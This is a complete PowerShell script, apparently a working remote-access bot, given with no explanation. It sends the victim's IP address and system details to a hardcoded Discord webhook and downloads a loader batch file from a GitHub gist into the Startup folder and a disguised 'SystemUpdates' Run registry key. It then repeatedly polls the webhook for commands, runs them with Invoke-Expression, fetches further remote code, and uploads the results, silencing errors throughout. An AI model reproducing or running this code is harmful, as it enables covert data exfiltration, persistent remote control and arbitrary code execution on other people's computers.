$temp = $env:TEMP;
$userprof = $env:USERPROFILE;
$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
$EventFilterName = 'Dcom Launcher';
$load = "$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat";
$uri = "https://discord.com/api/webhooks/981111472660828250/CWLcuIJJVB63kQ095YWTjGqR0aOOSmm8Tx8NePcB06OCiQVQc25jYmCQCTblGH9M3crS";
$updater = "https://gist.githubusercontent.com/siliconmutex/efb7271724e331cf57e71643d443b645/raw/92ac92ec885d7b71275a6c201ca47e4ac4d1a3c2/update"

try{
    $ip = (Invoke-WebRequest -uri "https://api.ipify.org/" -UseBasicParsing).Content 
    $hash = @{ "content" = "NEW BOT    >>-------**$ip**-------<<"; }
        $JSON = $hash | convertto-json
        Invoke-RestMethod -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}

    $sys = Get-WmiObject Win32_OperatingSystem | select -Property * | out-file $temp\mjCKMCrnUsANf3fXvZ5l1.txt 
                            
    $fileName = "mjCKMCrnUsANf3fXvZ5l1.txt"        
    $currentPath = $temp
    $filePath="$currentPath\$fileName"

    $fileBin = [System.IO.File]::ReadAlltext($filePath)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
    "Content-Type: application/octet-stream$LF",
    $fileBin,
    "--$boundary--$LF"
    ) -join $LF            

    Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
}
catch{
    continue
}

try{
    $ErrorActionPreference = 'SilentlyContinue'
    $userprof = $env:USERPROFILE;
    $tem = $env:TEMP;
    $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
    $wc = [System.Net.WebClient]::new();
    $loader = "https://gist.githubusercontent.com/siliconmutex/50dd4f5a4331676e9aaa681923c0af11/raw/b0a1faea028cf07cac92344fa1d068c93007aa65/loader";

    $dll = "SystemUpdates....9hdmNxcUguHounsfIr72.bat"
    $wc.DownloadFile("$loader","$tem\$dll");
    $wc.DownloadFile("$loader","$startUpFolder\SystemUpdates....9hdmNxcUguHounsfIr72.bat");

    $test = get-itemproperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -name SystemUpdates....9hdmNxcUguHounsfIr72

    if(-not($test)){
        $set = reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdates....9hdmNxcUguHounsfIr72 /t REG_SZ /d "$tem\$dll"
        }
    }
    

catch{
    continue
}
try {
    do {  
        
        $response = Invoke-WebRequest -Uri $uri -UseBasicParsing
        $jsonObj = ConvertFrom-Json $([String]::new($response.Content))        

        $jsonobj | select 'name' | out-file -filepath $temp\9hdmNxcUguHounsfIr72.txt
        $jsonobj1 = (Get-Content -Path "$temp\9hdmNxcUguHounsfIr72.txt" -tail 3) | Select-object -First 1 
        $files = (Get-Content -Path "$temp\9hdmNxcUguHounsfIr72.txt" -tail 3) | Select-object -First 1 | out-file -append $temp\LOl0InkQOQcrfIbUhToe.txt
        $jsonobj2 = (Get-Content -Path "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 1) | out-file $temp\qna.txt
            

        $a = (Get-Content "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 2)
        $b = (Get-Content "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 1)
        $ip = (Invoke-WebRequest -uri "https://api.ipify.org/" -UseBasicParsing).Content 
       
        if($b -Like "$ip *") {            
            $cmd = $b.split("$ip ")[14]            

            if ($a -ne $b){
                if($cmd -Like "github") {
                    
                    iex($call = Invoke-WebRequest -Uri https://gist.githubusercontent.com/siliconmutex/efb7271724e331cf57e71643d443b645/raw/a958347569cf7717259dee94aa0ae9ae512ecf2b/update -UseBasicParsing)
                    }

                try {
                    $rut = IEX($cmd) | out-file $temp\mjCKMCrnUsANf3fXvZ5l.txt 
                }
                catch {
                    $hash = @{ "content" = "BAD INPUT
                    
                       "; }
                    $JSON = $hash | convertto-json
                    Invoke-RestMethod -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
                    continue
                }
                

                if ([String]::IsNullOrWhiteSpace((Get-content $temp\mjCKMCrnUsANf3fXvZ5l.txt )) -eq 'True'){
                    $cat = "error" | out-file $temp\mjCKMCrnUsANf3fXvZ5l.txt 
                    
                }  
            

                $fileName = "mjCKMCrnUsANf3fXvZ5l.txt"        
                $currentPath = $temp
                $filePath="$currentPath\$fileName"

                $fileBin = [System.IO.File]::ReadAlltext($filePath)
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                $bodyLines = (
                "--$boundary",
                "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
                "Content-Type: application/octet-stream$LF",
                $fileBin,
                "--$boundary--$LF"
                ) -join $LF

                Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines

                
        }  
        }elseif ($a -ne $b){
            if($b -Like "github") {
                    
                iex($call = Invoke-WebRequest -Uri https://gist.githubusercontent.com/siliconmutex/efb7271724e331cf57e71643d443b645/raw/a958347569cf7717259dee94aa0ae9ae512ecf2b/update -UseBasicParsing)
            }

            try {
                $rut = IEX($jsonobj1) | out-file $temp\mjCKMCrnUsANf3fXvZ5l1.txt 
            }
            catch {
                $hash = @{ "content" = "BAD INPUT                                  
                   "; }
                $JSON = $hash | convertto-json
                Invoke-RestMethod -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
                continue
            }
            

            if ([String]::IsNullOrWhiteSpace((Get-content $temp\mjCKMCrnUsANf3fXvZ5l1.txt )) -eq 'True'){
                $cat = "error" | out-file $temp\mjCKMCrnUsANf3fXvZ5l1.txt 
                
            }  


            
            $fileName = "mjCKMCrnUsANf3fXvZ5l.txt"        
            $currentPath = $temp
            $filePath="$currentPath\$fileName"

            $fileBin = [System.IO.File]::ReadAlltext($filePath)
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream$LF",
            $fileBin,
            "--$boundary--$LF"
            ) -join $LF

            Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines

            
        } 
            
                      

    } until ( $response.StatusCode -eq [System.Net.HttpStatusCode]::NotFound )
}
catch {
     
     Write-Debug "StatusCode: $($_.Exception.Response.StatusCode.Value__)"
}
